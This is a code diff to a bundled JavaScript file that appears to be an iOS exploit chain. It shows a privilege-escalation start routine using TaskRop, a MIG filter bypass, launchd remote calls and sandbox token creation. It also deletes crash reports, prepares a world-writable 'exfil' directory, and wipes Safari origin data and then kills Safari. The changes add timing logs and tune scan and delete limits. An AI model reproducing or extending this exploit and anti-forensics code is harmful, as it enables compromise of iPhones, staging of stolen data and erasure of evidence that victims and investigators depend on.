@@ -8984,12 +8984,12 @@ function terminateSafariAfterClean(remoteKillTask) {
 	function auditSafariOriginData() {
 		const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
 		const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
-		const MAX_SCAN_ENTRIES = 5000;
+		const MAX_SCAN_ENTRIES = 1800;
 		const MAX_CANDIDATE_LOGS = 200;
-		const MAX_CONTENT_SCAN_FILES = 260;
-		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 1024 * 1024;
-		const MAX_TOTAL_CONTENT_SCAN_BYTES = 24 * 1024 * 1024;
-		const MAX_DELETE_TREE_ENTRIES = 2400;
+		const MAX_CONTENT_SCAN_FILES = 120;
+		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 64 * 1024;
+		const MAX_TOTAL_CONTENT_SCAN_BYTES = 4 * 1024 * 1024;
+		const MAX_DELETE_TREE_ENTRIES = 900;
 	const tokenPaths = [
 		"/private/var/mobile/Library/",
 		"/private/var/mobile/Library/WebKit/",
@@ -9762,6 +9762,15 @@ function start() {
 		} catch (_) {}
 	};
 	LOG("[+] PE start() called");
+	const phaseStarts = {};
+	function phaseStart(name) {
+		phaseStarts[name] = Date.now();
+		LOG("[PE-TIME] " + name + " start");
+	}
+	function phaseEnd(name) {
+		let elapsed = Date.now() - (phaseStarts[name] || Date.now());
+		LOG("[PE-TIME] " + name + " done " + elapsed + "ms");
+	}
 	let mutexPtr = null;
 	let migFilterBypass = null;
 	globalThis.xnuVersion = xnuVersion();
@@ -9783,32 +9792,47 @@ function start() {
 		return;
 
 
+	phaseStart("TaskRop.init");
 	libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__["default"].init();
-	if(migFilterBypass)
+	phaseEnd("TaskRop.init");
+	if(migFilterBypass) {
+		phaseStart("MigFilterBypass.start");
 		migFilterBypass.start();
+		phaseEnd("MigFilterBypass.start");
+	}
+	phaseStart("launchd RemoteCall");
 	let launchdTask = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"]("launchd",migFilterBypass);
+	phaseEnd("launchd RemoteCall");
 	if (!launchdTask.success()) {
 		launchdTask.destroy();
 		return false;
 	}
 	try {
 
+	phaseStart("Sandbox setup");
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].initWithLaunchdTask(launchdTask);
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].deleteCrashReports();
 	libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].createTokens();
+	phaseEnd("Sandbox setup");
+	phaseStart("Chain status log");
 	chainStatusInitLog();
+	phaseEnd("Chain status log");
 
 	// Create exfil output dir in /private/var/tmp (user-accessible via Filza)
+	phaseStart("Media dir prep");
 	let filzaDst = "/private/var/mobile/Media/Downloads/";
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mkdir", "/private/var/mobile/Media/Downloads", 0o777n);
 	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("chmod", "/private/var/mobile/Media/Downloads", 0o777n);
 	LOG("[PE] Exfil dir: " + filzaDst);
 	LOG("[PE] Chain status overlay log: " + CHAIN_STATUS_LOG_PATH);
+	phaseEnd("Media dir prep");
 
+	phaseStart("Safari clean+kill");
 	let safariCleanOk = runOptionalStage("Safari origin cleanup audit", ENABLE_SAFARI_ORIGIN_AUDIT, auditSafariOriginData);
 	if (safariCleanOk && ENABLE_SAFARI_KILL_AFTER_CLEAN) {
 		runOptionalStage("Safari app termination", true, () => terminateSafariAfterClean(launchdTask));
 	}
+	phaseEnd("Safari clean+kill");
 
 
 	let agentPid = 0;
